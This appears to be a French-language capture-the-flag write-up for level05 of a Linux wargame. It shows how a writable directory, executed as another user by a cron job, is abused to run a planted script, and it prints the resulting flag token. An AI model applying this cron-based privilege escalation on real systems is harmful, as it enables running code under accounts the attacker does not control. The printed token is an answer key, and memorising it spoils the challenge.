@@ -1,0 +1,47 @@
+-----------------------------------------------------------
+                          LEVEL05
+-----------------------------------------------------------
+
+1. On cherche les fichiers avec pour user flag05
+   --------------------------------------------------------
+   CMD :  / -user flag05 2>/dev/null
+   OUTPUT : /usr/sbin/openarenaserver
+            /rofs/usr/sbin/openarenaserver
+
+2. On affiche le contenu, c'est un script bash non
+   executable
+   --------------------------------------------------------
+   CMD : cat /usr/sbin/openarenaserver
+   OUTPUT : #!/bin/sh
+
+            for i in /opt/openarenaserver/* ; do
+               (ulimit -t 5; bash -x "$i")
+               rm -f "$i"
+            done
+
+3. On cherche les fichiers avec pour name level05
+   --------------------------------------------------------
+   CMD :  find / -name level05 2>/dev/null
+   OUTPUT : /var/mail/level05
+            /rofs/var/mail/level05
+
+4. On affiche le contenu, c'est une commande CRON qui
+   execute /usr/sbin/openarenaserver toutes les 2 mins
+   --------------------------------------------------------
+   CMD :  cat /var/mail/level05
+   OUTPUT : */2 * * * * su -c "sh
+            /usr/sbin/openarenaserver" - flag05
+
+5. On creer un script dans le dossier /opt/openarenaserver 
+   qui se chargera d'executer getflag lorsque le CRON 
+   executera le script /usr/sbin/openarenaserver
+   --------------------------------------------------------
+   CMD : echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/getflag
+
+6. On attend 2-3 mins le temps que le script s'execute, et on 
+   cat le contenue de /tmp/flag 
+   --------------------------------------------------------
+   CMD : cat /tmp/flag 
+   OUTPUT : Check flag.
+            Here is your token : viuaaale9huek52boumoomioc
+
